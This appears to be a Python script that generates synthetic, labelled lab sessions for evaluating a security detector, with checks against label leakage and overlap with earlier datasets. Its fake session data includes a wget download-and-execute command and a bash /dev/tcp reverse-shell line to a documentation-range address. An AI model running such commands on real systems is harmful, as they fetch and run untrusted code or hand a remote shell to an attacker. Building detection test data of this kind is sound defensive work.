"""Fresh authored local-session cohorts; labels never enter the operational runner.

Fresh session identities do not make these known scenario families an external blind
benchmark. Operational approvals and compromise reports below are simulated lab facts.
"""

import hashlib
import json
import re
import secrets
from collections import Counter
from datetime import UTC, datetime, timedelta
from pathlib import Path

from app.behavior_context_models import BehaviorScope
from app.services.public_detection import PublicSession
from scripts.evaluate_m6 import unique_fields
from scripts.m7_shadow_overlap import OPTIONAL, REQUIRED

ROOT = Path(__file__).resolve().parents[1]
OPAQUE = re.compile(r"x-[a-f0-9]{32}")
SCHEMA = "m7-context-input-1"
# Labels and descriptions stay in the private plan, never in the operational specs.
STRATA = (
    ("approved_upload", "normal", "approved_baseline", "Scheduled reviewed upload with an applicable advance approval."),
    ("approved_delete", "normal", "approved_baseline", "Scheduled reviewed retention deletion with an applicable advance approval."),
    ("approved_download", "normal", "approved_baseline", "Scheduled reviewed archive download with an applicable advance approval."),
    ("approved_install", "normal", "approved_baseline", "Reviewed package installation during the advance approved window."),
    ("other_device_report", "normal", "approved_baseline", "Approved work; the adverse report belongs to a different registered device."),
    ("unregistered_report", "normal", "approved_baseline", "Approved work; an unregistered signing key produces an uncorroborated report."),
    ("benign_missing_approval", "normal", "none", "Known benign lab job; its approval record is unavailable to the system."),
    ("benign_expired_approval", "normal", "none", "Known benign delayed lab job; the recorded permission window has expired."),
    ("benign_revoked_approval", "normal", "none", "Known benign lab task continues after cancellation; authorization is not implied."),
    ("maintenance_isolation", "normal", "none", "Known benign maintenance isolation; revocation alone is not compromise evidence."),
    ("device_intrusion_upload", "threat", "device", "Lab intrusion is corroborated by a registered device reporter for this device."),
    ("device_intrusion_download", "threat", "device", "Lab credential misuse on a compromised device has a matching signed report."),
    ("guardduty_intrusion", "threat", "guardduty", "Lab cloud intrusion has a registered finding bound to this user and resource."),
    ("remote_shell_attempt", "threat", "remote_shell", "An unapproved interactive remote-shell command is recorded; success is not assumed."),
    ("hidden_bulk_exfiltration", "threat", "none", "A stolen approved job performs bulk data theft; destination and intrusion evidence are absent."),
    ("hidden_low_volume_theft", "threat", "none", "A stolen approved job reads a small amount of data; available telemetry does not expose intent."),
    ("unexplained_bulk_work", "unknown", "none", "Bulk work has no approval or corroborating record and its intent is unresolved."),
    ("unknown_device_posture", "unknown", "none", "Device posture is unknown; it does not establish either compromise or safe operation."),
    ("future_approval", "unknown", "none", "An approval exists only for a future window; present activity remains unresolved."),
    ("exhausted_approval", "unknown", "none", "The recorded distinct-capture approval quota was already consumed."),
    ("revoked_baseline", "unknown", "none", "The normal-operation baseline was withdrawn before this observation."),
    ("outside_volume", "unknown", "none", "Observed volume exceeds the prior reviewed bounds; malicious intent is not established."),
    ("outside_resource", "unknown", "none", "Observed object is outside the reviewed resource set; intent remains unresolved."),
    ("outside_operation", "unknown", "none", "Observed API operation is outside the reviewed operation profile; intent remains unresolved."),
)
ADDITIONAL_PRIOR = (
    "runtime/m7/public-independent/dataset/public-observations.jsonl",
    "runtime/m7/public-independent/dataset/rule-inputs.jsonl",
    "runtime/m7/public-independent/dataset/private/scoring.jsonl",
    "runtime/m7/public-behavior-development/dataset/observations.jsonl",
    "runtime/m7/public-behavior-development/dataset/private/scoring.jsonl",
    "runtime/m7/public-behavior-holdout/dataset/observations.jsonl",
    "runtime/m7/public-behavior-holdout/dataset/private/scoring.jsonl",
    "runtime/m7/public-behavior-v2-regression/development/dataset/observations.jsonl",
    "runtime/m7/public-behavior-v2-regression/development/dataset/private/scoring.jsonl",
    "runtime/m7/public-behavior-v2-regression/previous-holdout/dataset/observations.jsonl",
    "runtime/m7/public-behavior-v2-regression/previous-holdout/dataset/private/scoring.jsonl",
    "runtime/m7/shadow-assist/model-requests.jsonl",
    "runtime/m7/shadow-assist/private/scoring-plan.jsonl",
    "runtime/m7/shadow-assist/private/local-capture.jsonl",
    "runtime/m7/device-rule-validation/report.json",
    "app/data/benchmark/cases.jsonl",
    "app/data/benchmark/families.json",
)
IDENTITY_KEYS = {
    "id", "case_id", "session_id", "capture_id", "original_group_id", "original_session_id",
    "raw_session_id", "event_id", "evidence_id", "connection_id", "pair_id", "trace_id",
}
HASH_KEYS = {"sha256", "input_sha256", "input_digest_sha256", "request_sha256", "capture_sha256"}
FORBIDDEN_KEYS = {
    "label", "labels", "ground_truth", "expected_label", "expected_verdict", "expected_support",
    "family", "rationale", "reference_kind", "support_event_ids", "support_event_sha256", "verdict", "scenario", "stratum",
}


def canonical(value):
    return json.dumps(value, sort_keys=True, ensure_ascii=False, separators=(",", ":"), allow_nan=False).encode()


def digest(value):
    return hashlib.sha256(value if isinstance(value, bytes) else canonical(value)).hexdigest()


def opaque():
    return "x-" + secrets.token_hex(16)


def _activity(source, instant, actor, resources, count, operation, command=None):
    connection = opaque()
    events = []
    for index in range(count):
        event = {"id": opaque(), "timestamp": instant.isoformat(), "connection_id": connection,
                 "principal_hash": actor, "resource_hashes": [resources[index % len(resources)]],
                 "outcome": "success"}
        if source == "cloudtrail":
            event.update(kind="AwsApiCall", api_service="s3.amazonaws.com", api_action=operation)
        else:
            event.update(kind="cowrie.command.input", command=command)
        events.append(event)
    return PublicSession.model_validate({"source": source, "original_group_id": opaque(), "events": events}).model_dump(mode="json")


def build_dataset(repetitions=10):
    if type(repetitions) is not int or not 1 <= repetitions <= 50:
        raise ValueError("context_dataset_repetitions")
    inputs, labels = [], []
    instant = datetime(2026, 11, 10, 3, tzinfo=UTC)
    for family, label, support, rationale in STRATA:
        for repetition in range(repetitions):
            case_id, actor = opaque(), opaque()
            source = "cowrie" if family in {"approved_install", "remote_shell_attempt"} else "cloudtrail"
            scope = {"source": source, "user_id": opaque(), "device_id": opaque(),
                     "resource_id": "zt-demo-documents", "action": "READ", "principal_hash": actor}
            resources = [opaque() for _ in range(25)]
            operation = "PutObject"
            if family in {"approved_delete"}: operation = "DeleteObject"
            if family in {"approved_download", "device_intrusion_download", "hidden_bulk_exfiltration", "hidden_low_volume_theft"}: operation = "GetObject"
            count = 100 + repetition % 10
            if source == "cowrie" or family == "hidden_low_volume_theft": count = 1
            package = "pkg-" + secrets.token_hex(8)
            command = f"wget https://packages.example.invalid/{package} -O /tmp/{package}; chmod +x /tmp/{package}; /tmp/{package}"
            def sample(offset, *, volume=count, action=operation, objects=resources, text=command, source=source, actor=actor):
                return {"capture_id": opaque(), "session_id": opaque(),
                        "activity": _activity(source, instant + timedelta(seconds=offset), actor, objects, volume, action, text)}
            samples = [sample(offset) for offset in range(3)]
            target = sample(10)
            if family == "outside_volume": target = sample(10, volume=count + 25)
            if family == "outside_resource": target = sample(10, objects=[opaque() for _ in resources])
            if family == "outside_operation": target = sample(10, action="DeleteObject")
            if family == "remote_shell_attempt":
                target = sample(10, text=f"bash -i >& /dev/tcp/192.0.2.{10 + repetition % 200}/4444 0>&1")
            mode = {"benign_missing_approval": "missing", "unexplained_bulk_work": "missing",
                    "benign_expired_approval": "expired", "benign_revoked_approval": "revoked",
                    "future_approval": "future", "exhausted_approval": "exhausted"}.get(family, "valid")
            observation = {"id": opaque(), "kind": "none", "scope": "same", "signature": "valid", "posture": "compromised"}
            if family in {"device_intrusion_upload", "device_intrusion_download", "other_device_report", "unregistered_report", "unknown_device_posture"}:
                observation["kind"] = "device"
            if family == "guardduty_intrusion": observation["kind"] = "guardduty"
            if family == "other_device_report": observation["scope"] = "other"
            if family == "unregistered_report": observation["signature"] = "invalid"
            if family == "unknown_device_posture": observation["posture"] = "unknown"
            spec = {"case_id": case_id, "base_time": instant.isoformat(), "tenant_id": opaque(), "scope": scope,
                    "baseline_samples": samples, "target": target,
                    "baseline": {"id": opaque(), "enabled": True, "revoked": family == "revoked_baseline"},
                    "approval": {"id": opaque(), "mode": mode, "max_uses": 1}, "observation": observation,
                    "session_revoke": family == "maintenance_isolation",
                    "prior_use": sample(5) if mode == "exhausted" else None}
            inputs.append(spec)
            labels.append({"case_id": case_id, "label": label, "family": family, "rationale": rationale,
                           "reference_kind": "authored_controlled_lab_ground_truth",
                           "expected_support": [support],
                           "support_event_ids": [event["id"] for event in target["activity"]["events"]] if support == "remote_shell" else [],
                           "support_event_sha256": {event["id"]: digest(event) for event in target["activity"]["events"]} if support == "remote_shell" else {}})
    inputs.sort(key=lambda row: row["case_id"])
    labels.sort(key=lambda row: row["case_id"])
    audit_inputs(inputs, labels)
    return inputs, labels


def _keys(value, expected, name):
    if not isinstance(value, dict) or set(value) != set(expected):
        raise ValueError("context_dataset_shape:" + name)


def _walk(value):
    if isinstance(value, dict):
        yield value
        for item in value.values(): yield from _walk(item)
    elif isinstance(value, list):
        for item in value: yield from _walk(item)


def _samples(spec):
    return spec["baseline_samples"] + ([spec["prior_use"]] if spec["prior_use"] else []) + [spec["target"]]


def audit_inputs(inputs, labels=None):
    if not isinstance(inputs, list) or not inputs:
        raise ValueError("context_dataset_empty")
    identities, event_ids, groups, connections = set(), set(), set(), set()
    requests, observations = set(), set()
    baseline_count = prior_count = 0
    for spec in inputs:
        _keys(spec, ("case_id", "base_time", "tenant_id", "scope", "baseline_samples", "target", "baseline", "approval", "observation", "session_revoke", "prior_use"), "spec")
        for node in _walk(spec):
            if set(node) & FORBIDDEN_KEYS: raise ValueError("context_dataset_label_leak")
        for key in ("case_id", "tenant_id"):
            if not isinstance(spec[key], str) or not OPAQUE.fullmatch(spec[key]): raise ValueError("context_dataset_opaque_id")
        if spec["case_id"] in identities: raise ValueError("context_dataset_duplicate_identity")
        identities.add(spec["case_id"])
        start = datetime.fromisoformat(spec["base_time"])
        if start.utcoffset() is None: raise ValueError("context_dataset_naive_clock")
        scope = BehaviorScope.model_validate(spec["scope"])
        for value in (scope.user_id, scope.device_id, scope.principal_hash):
            if not OPAQUE.fullmatch(value): raise ValueError("context_dataset_opaque_scope")
        _keys(spec["baseline"], ("id", "enabled", "revoked"), "baseline")
        _keys(spec["approval"], ("id", "mode", "max_uses"), "approval")
        _keys(spec["observation"], ("id", "kind", "scope", "signature", "posture"), "observation")
        for name in ("baseline", "approval", "observation"):
            if not OPAQUE.fullmatch(spec[name]["id"]): raise ValueError("context_dataset_opaque_record")
        if any(type(spec["baseline"][key]) is not bool for key in ("enabled", "revoked")) or type(spec["session_revoke"]) is not bool:
            raise ValueError("context_dataset_boolean")
        if spec["approval"]["mode"] not in {"valid", "missing", "expired", "revoked", "exhausted", "future"} or type(spec["approval"]["max_uses"]) is not int or spec["approval"]["max_uses"] != 1:
            raise ValueError("context_dataset_approval")
        obs = spec["observation"]
        if obs["kind"] not in {"none", "device", "guardduty"} or obs["scope"] not in {"same", "other"} or obs["signature"] not in {"valid", "invalid"} or obs["posture"] not in {"compromised", "unknown"}:
            raise ValueError("context_dataset_observation")
        if not isinstance(spec["baseline_samples"], list) or len(spec["baseline_samples"]) != 3:
            raise ValueError("context_dataset_baseline_count")
        if (spec["prior_use"] is not None) != (spec["approval"]["mode"] == "exhausted"):
            raise ValueError("context_dataset_prior_use")
        for index, sample in enumerate(_samples(spec)):
            _keys(sample, ("capture_id", "session_id", "activity"), "sample")
            for key in ("capture_id", "session_id"):
                value = sample[key]
                if not isinstance(value, str) or not OPAQUE.fullmatch(value): raise ValueError("context_dataset_opaque_sample")
                if value in identities: raise ValueError("context_dataset_duplicate_identity")
                identities.add(value)
            activity = PublicSession.model_validate(sample["activity"])
            if activity.source != scope.source: raise ValueError("context_dataset_source")
            if not OPAQUE.fullmatch(activity.original_group_id) or activity.original_group_id in groups:
                raise ValueError("context_dataset_group_overlap")
            groups.add(activity.original_group_id)
            sample_connections = set()
            for event in activity.events:
                if not OPAQUE.fullmatch(event.id) or event.id in event_ids: raise ValueError("context_dataset_event_overlap")
                if not event.connection_id or not OPAQUE.fullmatch(event.connection_id): raise ValueError("context_dataset_connection")
                if event.principal_hash != scope.principal_hash: raise ValueError("context_dataset_actor")
                expected_offset = index if index < 3 else (5 if sample is spec["prior_use"] else 10)
                if event.timestamp != start + timedelta(seconds=expected_offset): raise ValueError("context_dataset_event_time")
                event_ids.add(event.id)
                sample_connections.add(event.connection_id)
            if sample_connections & connections: raise ValueError("context_dataset_connection_overlap")
            connections.update(sample_connections)
            fingerprint = digest(sample["activity"])
            if fingerprint in observations: raise ValueError("context_dataset_observation_overlap")
            observations.add(fingerprint)
        request_hash = digest(spec)
        if request_hash in requests: raise ValueError("context_dataset_request_overlap")
        requests.add(request_hash)
        baseline_count += len(spec["baseline_samples"])
        prior_count += spec["prior_use"] is not None
    label_counts = None
    if labels is not None:
        if not isinstance(labels, list) or len(labels) != len(inputs): raise ValueError("context_dataset_label_count")
        by_id = {row["case_id"]: row for row in inputs}
        seen = set()
        for row in labels:
            _keys(row, ("case_id", "label", "family", "rationale", "reference_kind", "expected_support", "support_event_ids", "support_event_sha256"), "label")
            if row["case_id"] not in by_id or row["case_id"] in seen or row["label"] not in {"normal", "threat", "unknown"}:
                raise ValueError("context_dataset_label_identity")
            seen.add(row["case_id"])
            if row["expected_support"] not in [[name] for name in ("approved_baseline", "device", "guardduty", "remote_shell", "none")]:
                raise ValueError("context_dataset_label_support")
            target_ids = {event["id"] for event in by_id[row["case_id"]]["target"]["activity"]["events"]}
            if not set(row["support_event_ids"]) <= target_ids: raise ValueError("context_dataset_label_event")
            expected_hashes = {event["id"]: digest(event) for event in by_id[row["case_id"]]["target"]["activity"]["events"] if event["id"] in row["support_event_ids"]}
            if row["support_event_sha256"] != expected_hashes: raise ValueError("context_dataset_label_event_hash")
        label_counts = dict(Counter(row["label"] for row in labels))
    return {"passed": True, "target_sessions": len(inputs), "baseline_sessions": baseline_count,
            "prior_use_sessions": prior_count, "all_session_ids": baseline_count + prior_count + len(inputs),
            "global_event_ids": len(event_ids), "group_ids": len(groups), "connection_ids": len(connections),
            "input_sha256_count": len(requests), "label_fields_in_inputs": 0,
            "target_baseline_identity_overlap": 0, "label_counts": label_counts,
            "scope": "Fresh authored local sessions. Known scenario families are reused, not an external blind benchmark."}


def _fingerprints(value):
    ids, hashes, observations = set(), set(), set()
    for node in _walk(value):
        for key, item in node.items():
            if key in IDENTITY_KEYS and isinstance(item, str) and not re.fullmatch(r"(?:e|ev|event|evidence)[-_]?\d+", item, re.IGNORECASE):
                ids.add(item)
            if key in HASH_KEYS and isinstance(item, str) and re.fullmatch(r"[a-f0-9]{64}", item): hashes.add(item)
        if "events" in node and isinstance(node["events"], list):
            observations.add(digest(node))
            if node.get("source") in {"cowrie", "cloudtrail"} and "original_group_id" in node:
                try:
                    observations.add(digest(PublicSession.model_validate(node).model_dump(mode="json")))
                except ValueError:
                    pass
    hashes.add(digest(value))
    return {"identifiers": ids, "request_or_source_hashes": hashes, "observations": observations}


def _read_rows(path):
    if path.stat().st_size > 64 * 1024 * 1024: raise ValueError("context_dataset_prior_file_too_large:" + str(path))
    raw = path.read_bytes()
    if len(raw) > 64 * 1024 * 1024: raise ValueError("context_dataset_prior_file_too_large:" + str(path))
    if path.suffix == ".jsonl":
        rows = [json.loads(line, object_pairs_hook=unique_fields) for line in raw.splitlines() if line.strip()]
    else:
        doc = json.loads(raw, object_pairs_hook=unique_fields)
        rows = doc if isinstance(doc, list) else (doc.get("rows", doc.get("cases", [doc])) if isinstance(doc, dict) else None)
    if not isinstance(rows, list) or any(not isinstance(row, dict) for row in rows):
        raise ValueError("context_dataset_prior_shape:" + str(path))
    return raw, rows


def validate_input(spec):
    """Validate a single runtime specification without reading any private labels."""
    return audit_inputs([spec])


def audit_prior_overlap(inputs, root=ROOT, *, pinned=None, exclude_directory=None, required_files=None, optional_files=None):
    audit_inputs(inputs)
    root = Path(root).resolve()
    required = list(dict.fromkeys([*REQUIRED, *ADDITIONAL_PRIOR])) if required_files is None else list(required_files)
    optional = list(OPTIONAL) if optional_files is None else list(optional_files)
    # Narrow inventory: only sibling context evaluation bundles, never raw logs or credentials.
    if pinned is not None:
        required = list(pinned["sources"])
        optional = []
    elif required_files is None:
        manifests = list((root / "runtime/m7").glob("*/manifest.json"))
        manifests += list((root / "runtime/m7").glob("*/dataset/manifest.json"))
        for manifest_path in sorted(manifests):
            if exclude_directory and manifest_path.is_relative_to(Path(exclude_directory).resolve()): continue
            manifest = json.loads(manifest_path.read_text(), object_pairs_hook=unique_fields)
            if str(manifest.get("schema", "")).startswith(("m7-context", "m6-context", "context-comparison")):
                candidate = manifest_path.parent / "inputs.jsonl"
                required.append(str(candidate.relative_to(root)))
    combined = {key: set() for key in ("identifiers", "request_or_source_hashes", "observations")}
    for spec in inputs:
        fp = _fingerprints(spec)
        fp["identifiers"].add(spec["case_id"])
        for key, values in combined.items(): values.update(fp[key])
    sources, missing = {}, list(pinned.get("missing_optional", [])) if pinned else []
    for name in dict.fromkeys(required + optional):
        path = root / name
        if not path.resolve().is_relative_to(root): raise ValueError("context_dataset_prior_path")
        if not path.is_file():
            if name in required: raise ValueError("context_dataset_missing_prior:" + name)
            missing.append(name)
            continue
        raw, rows = _read_rows(path)
        expected_count = (REQUIRED | OPTIONAL).get(name)
        if expected_count is not None and len(rows) != expected_count:
            raise ValueError("context_dataset_prior_count:" + name)
        manifest_evidence = None
        for parent in (path.parent, path.parent.parent):
            manifest_path = parent / "manifest.json"
            if not manifest_path.is_file() or not manifest_path.resolve().is_relative_to(root): continue
            manifest = json.loads(manifest_path.read_bytes(), object_pairs_hook=unique_fields)
            declared = manifest.get("files", {}).get(str(path.relative_to(parent)))
            if isinstance(declared, str):
                if declared != digest(raw): raise ValueError("context_dataset_prior_manifest_mismatch:" + name)
                manifest_evidence = {"path": str(manifest_path.relative_to(root)), "sha256": digest(manifest_path.read_bytes())}
                break
        if pinned is not None and digest(raw) != pinned["sources"][name]["sha256"]:
            raise ValueError("context_dataset_prior_changed:" + name)
        if pinned is not None and pinned["sources"][name].get("manifest") != manifest_evidence:
            raise ValueError("context_dataset_prior_manifest_changed:" + name)
        prior = {key: set() for key in combined}
        for row in rows:
            for key, values in _fingerprints(row).items(): prior[key].update(values)
        overlaps = {key: len(prior[key] & combined[key]) for key in combined}
        if any(overlaps.values()): raise ValueError("context_dataset_prior_overlap:" + name + ":" + json.dumps(overlaps, sort_keys=True))
        sources[name] = {"sha256": digest(raw), "rows": len(rows), "identifiers": len(prior["identifiers"]), "overlaps": overlaps, "manifest": manifest_evidence}
    return {"passed": True, "sources": sources, "missing_optional": missing,
            "prior_files_checked": len(sources), "overlap_counts": {key: 0 for key in combined},
            "scope": "Exact saved identity and observation/request fingerprints only; known behavioral patterns may recur.",
            "external_independent_evaluation": False}
